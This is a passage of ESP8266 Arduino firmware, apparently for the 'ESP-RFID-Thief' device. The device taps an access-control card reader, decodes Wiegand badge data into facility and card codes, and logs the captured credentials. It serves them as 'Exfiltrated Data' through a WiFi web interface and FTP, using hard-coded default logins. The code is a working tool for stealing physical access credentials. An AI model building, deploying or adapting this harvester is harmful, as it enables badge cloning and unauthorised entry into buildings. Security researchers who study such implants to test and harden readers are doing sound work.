Settings</a><br>-<br><a href=\"/format\">Format File System</a><br>-<br><a href=\"/firmware\">Upgrade Firmware</a><br>-<br><a href=\"/help\">Help</a></body></html>"));
  });

  server.onNotFound([]() {
    if (!RawFile(server.uri()))
      server.send(404, "text/plain", F("Error 404 File Not Found"));
  });
  server.on("/settings", handleSettings);

  server.on("/firmware", [](){
    server.send(200, "text/html", String()+F("<html><body style=\"height: 100%;\"><a href=\"/\"><- BACK TO INDEX</a><br><br>Open Arduino IDE.<br>Pull down \"Sketch\" Menu then select \"Export Compiled Binary\".<br>On this page click \"Browse\", select the binary you exported earlier, then click \"Update\".<br>You may need to manually reboot the device to reconnect.<br><iframe style =\"border: 0; height: 100%;\" src=\"http://")+local_IPstr+F(":1337/update\"><a href=\"http://")+local_IPstr+F(":1337/update\">Click here to Upload Firmware</a></iframe></body></html>"));
  });

  server.on("/restoredefaults", [](){
    server.send(200, "text/html", F("<html><body>This will restore the device to the default configuration.<br><br>Are you sure?<br><br><a href=\"/restoredefaults/yes\">YES</a> - <a href=\"/\">NO</a></body></html>"));
  });

  server.on("/restoredefaults/yes", [](){
    if(!server.authenticate(update_username, update_password))
      return server.requestAuthentication();
    server.send(200, "text/html", F("<a href=\"/\"><- BACK TO INDEX</a><br><br>Network<br>---<br>SSID: <b>ESP-RFID-Thief</b><br><br>Administration<br>---<br>USER: <b>admin</b> PASS: <b>hacktheplanet</b>"));
    loadDefaults();
    ESP.restart();
  });

  server.on("/deletelog", [](){
    String deletelog;
    deletelog += server.arg(0);
    server.send(200, "text/html", String()+F("<html><body>This will delete the file: ")+deletelog+F(".<br><br>Are you sure?<br><br><a href=\"/deletelog/yes?payload=")+deletelog+F("\">YES</a> - <a href=\"/\">NO</a></body></html>"));
  });

  server.on("/viewlog", ViewLog);

  server.on("/deletelog/yes", [](){
    if(!server.authenticate(update_username, update_password))
      return server.requestAuthentication();
    String deletelog;
    deletelog += server.arg(0);
    if (!deletelog.startsWith("/payloads/")) server.send(200, "text/html", String()+F("<a href=\"/\"><- BACK TO INDEX</a><br><br><a href=\"/logs\">List Exfiltrated Data</a><br><br>Deleting file: ")+deletelog);
    SPIFFS.remove(deletelog);
  });

  server.on("/format", [](){
    server.send(200, "text/html", F("<html><body><a href=\"/\"><- BACK TO INDEX</a><br><br>This will reformat the SPIFFS File System.<br><br>Are you sure?<br><br><a href=\"/format/yes\">YES</a> - <a href=\"/\">NO</a></body></html>"));
  });

  server.on("/logs", ListLogs);

  server.on("/reboot", [](){
    if(!server.authenticate(update_username, update_password))
    return server.requestAuthentication();
    server.send(200, "text/html", F("<a href=\"/\"><- BACK TO INDEX</a><br><br>Rebooting Device..."));
    ESP.restart();
  });
  
  server.on("/format/yes", [](){
    if(!server.authenticate(update_username, update_password))
      return server.requestAuthentication();
    server.send(200, "text/html", F("<a href=\"/\"><- BACK TO INDEX</a><br><br>Formatting file system: This may take up to 90 seconds"));
//    Serial.print("Formatting file system...");
    SPIFFS.format();
//    Serial.println(" Success");
    saveConfig();
  });
  
  server.on("/help", []() {
    server.send_P(200, "text/html", HelpText);
  });
  
  server.on("/license", []() {
    server.send_P(200, "text/html", License);
  });
  
  server.begin();
  WiFiClient client;
  client.setNoDelay(1);

//  Serial.println("Web Server Started");

  MDNS.begin("ESP");

  httpUpdater.setup(&httpServer, update_path, update_username, update_password);
  httpServer.begin();

  MDNS.addService("http", "tcp", 1337);
  
  if (ftpenabled==1){
    ftpSrv.begin(String(ftp_username),String(ftp_password));
  }

//Start RFID Reader
  pinMode(LED_BUILTIN, OUTPUT);  // LED
  if (ledenabled==1){
    digitalWrite(LED_BUILTIN, LOW);
  }
  else{
    digitalWrite(LED_BUILTIN, HIGH);
  }
  pinMode(DATA0, INPUT);     // DATA0 (INT0)
  pinMode(DATA1, INPUT);     // DATA1 (INT1)
  
  //Serial.println("RFID Reader Started");
  
  // binds the ISR functions to the falling edge of INTO and INT1
  attachInterrupt(DATA0, ISR_INT0, FALLING);  
  attachInterrupt(DATA1, ISR_INT1, FALLING);

  weigand_counter = WEIGAND_WAIT_TIME;
}
//

//Do It!

///////////////////////////////////////////////////////
// LOOP function
void loop()
{
  if (ftpenabled==1){
    ftpSrv.handleFTP();
  }
  server.handleClient();
  httpServer.handleClient();
  while (Serial.available()) {
    String cmd = Serial.readStringUntil(':');
        if(cmd == "ResetDefaultConfig"){
          loadDefaults();
          ESP.restart();
        }
  }
  drd.loop();

//Serial.print("Free heap-");
//Serial.println(ESP.getFreeHeap(),DEC);

  // This waits to make sure that there have been no more data pulses before processing data
  if (!flagDone) {    

    if (--weigand_counter == 0)
      flagDone = 1;  

  }
  
  // if we have bits and we the weigand counter went out
  if (bitCount > 0 && flagDone) {
    unsigned char i;
    
    getCardValues();
    getCardNumAndSiteCode();
       
    printBits();

     // cleanup and get ready for the next card
     bitCount = 0; facilityCode = 0; cardCode = 0;
     bitHolder1 = 0; bitHolder2 = 0;
     cardChunk1 = 0; cardChunk2 = 0;
     
     for (i=0; i<MAX_BITS; i++) 
     {
       databits[i] = 0;
     }
  }
  
  // Check if someone is requesting a Web Page
  server.handleClient();

}

///////////////////////////////////////////////////////
// PRINTBITS function
void printBits()
{
      
      // open the file in append mode
      File f = SPIFFS.open("/"+String(logname), "a");
      f.print(bitCount);
      f.print(" bit card : ");
      //f.print(facilityCode);
      //f.print(" : ");
      //f.print(cardCode);
      //f.print(" : ");
      f.print("HEX = ");
      f.print(cardChunk1, HEX);
      f.println(cardChunk2, HEX);
      f.close();

      Serial.print(bitCount);
      Serial.print(" bit card : ");
      //Serial.print("FC = ");
      //Serial.print(facilityCode, HEX);
      //Serial.print(", CC = ");
      //Serial.print(cardCode, HEX);
      Serial.print(", HEX = ");
      Serial.print(cardChunk1, HEX);
      Serial.println(cardChunk2, HEX);

}


///////////////////////////////////////////////////////
// SETUP function
void getCardNumAndSiteCode()
{
     unsigned char i;
  
    // we will decode the bits differently depending on how many bits we have
    // see www.pagemac.com/azure/data_formats.php for more info
    // also specifically: www.brivo.com/app/static_data/js/calculate.js
    switch (bitCount) {

      
    ///////////////////////////////////////
    // standard 26 bit format
    // facility code = bits 2 to 9  
    case 26:
      for (i=1; i<9; i++)
      {
         facilityCode <<=1;
         facilityCode |= databits[i];
      }
      
      // card code = bits 10 to 23
      for (i=9; i<25; i++)
      {
         cardCode <<=1;
         cardCode |= databits[i];
      }
      break;

    ///////////////////////////////////////
    // 33 bit HID Generic    
    case 33:  
      for (i=1; i<8; i++)
      {
         facilityCode <<=1;
         facilityCode |= databits[i];
      }
      
      // card code
      for (i=8; i<32; i++)
      {
         cardCode <<=1;
         cardCode |= databits[i];
      }    
      break;

    ///////////////////////////////////////
    // 34 bit HID Generic 
    case 34:  
      for (i=1; i<17; i++)
      {
         facilityCode <<=1;
         facilityCode |= databits[i];
      }
      
      // card code
      for (i=17; i<33; i++)
      {
         cardCode <<=1;
         cardCode |= databits[i];
      }    
      break;
 
    ///////////////////////////////////////
    // 35 bit HID Corporate 1000 format
    // facility code = bits 2 to 14     
    case 35:  
      for (i=2; i<14; i++)
      {
         facilityCode <<=1;
         facilityCode |= databits[i];
      }
      
      // card code = bits 15 to 34
      for (i=14; i<34; i++)
      {
         cardCode <<=1;
         cardCode |= databits[i];
      }    
      break;

    }
    return;
  
}


//////////////////////////////////////
// Function to append the card value (bitHolder1 and bitHolder2) to the necessary array then tranlate that to
// the two chunks for the card value that will be output
void getCardValues() {
  switch (bitCount) {
    case 26:
        // Example of full card value
        // |>   preamble   <| |>   Actual card value   <|
        // 000000100000000001 11 111000100000100100111000
        // |> write to chunk1 <| |>  write to chunk2   <|
        
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 2){
            bitWrite(cardChunk1, i, 1); // Write preamble 1's to the 13th and 2nd bits
          }
          else if(i > 2) {
            bitWrite(cardChunk1, i, 0); // Write preamble 0's to all other bits above 1
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 20)); // Write remaining bits to cardChunk1 from bitHolder1
          }
          if(i < 20) {
            bitWrite(cardChunk2, i + 4, bitRead(bitHolder1, i)); // Write the remaining bits of bitHolder1 to cardChunk2
          }
          if(i < 4) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i)); // Write the remaining bit of cardChunk2 with bitHolder2 bits
          }
        }
        break;

    case 27:
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 3){
            bitWrite(cardChunk1, i, 1);
          }
          else if(i > 3) {
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 19));
          }
          if(i < 19) {
            bitWrite(cardChunk2, i + 5, bitRead(bitHolder1, i));
          }
          if(i < 5) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;

    case 28:
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 4){
            bitWrite(cardChunk1, i, 1);
          }
          else if(i > 4) {
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 18));
          }
          if(i < 18) {
            bitWrite(cardChunk2, i + 6, bitRead(bitHolder1, i));
          }
          if(i < 6) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;

    case 29:
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 5){
            bitWrite(cardChunk1, i, 1);
          }
          else if(i > 5) {
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 17));
          }
          if(i < 17) {
            bitWrite(cardChunk2, i + 7, bitRead(bitHolder1, i));
          }
          if(i < 7) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;

    case 30:
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 6){
            bitWrite(cardChunk1, i, 1);
          }
          else if(i > 6) {
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 16));
          }
          if(i < 16) {
            bitWrite(cardChunk2, i + 8, bitRead(bitHolder1, i));
          }
          if(i < 8) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;

    case 31:
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 7){
            bitWrite(cardChunk1, i, 1);
          }
          else if(i > 7) {
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 15));
          }
          if(i < 15) {
            bitWrite(cardChunk2, i + 9, bitRead(bitHolder1, i));
          }
          if(i < 9) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;

    case 32:
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 8){
            bitWrite(cardChunk1, i, 1);
          }
          else if(i > 8) {
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 14));
          }
          if(i < 14) {
            bitWrite(cardChunk2, i + 10, bitRead(bitHolder1, i));
          }
          if(i < 10) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;

    case 33:
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 9){
            bitWrite(cardChunk1, i, 1);
          }
          else if(i > 9) {
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 13));
          }
          if(i < 13) {
            bitWrite(cardChunk2, i + 11, bitRead(bitHolder1, i));
          }
          if(i < 11) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;

    case 34:
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 10){
            bitWrite(cardChunk1, i, 1);
          }
          else if(i > 10) {
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 12));
          }
          if(i < 12) {
            bitWrite(cardChunk2, i + 12, bitRead(bitHolder1, i));
          }
          if(i < 12) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;

    case 35:        
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 11){
            bitWrite(cardChunk1, i, 1);
          }
          else if(i > 11) {
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 11));
          }
          if(i < 11) {
            bitWrite(cardChunk2, i + 13, bitRead(bitHolder1, i));
          }
          if(i < 13) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;

    case 36:
       for(int i = 19; i >= 0; i--) {
          if(i == 13 || i == 12){
            bitWrite(cardChunk1, i, 1);
          }
          else if(i > 12) {
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 10));
          }
          if(i < 10) {
            bitWrite(cardChunk2, i + 14, bitRead(bitHolder1, i));
          }
          if(i < 14) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;

    case 37:
       for(int i = 19; i >= 0; i--) {
          if(i == 13){
            bitWrite(cardChunk1, i, 0);
          }
          else {
            bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 9));
          }
          if(i < 9) {
            bitWrite(cardChunk2, i + 15, bitRead(bitHolder1, i));
          }
          if(i < 15) {
            bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
          }
        }
        break;
  }
  return;
}
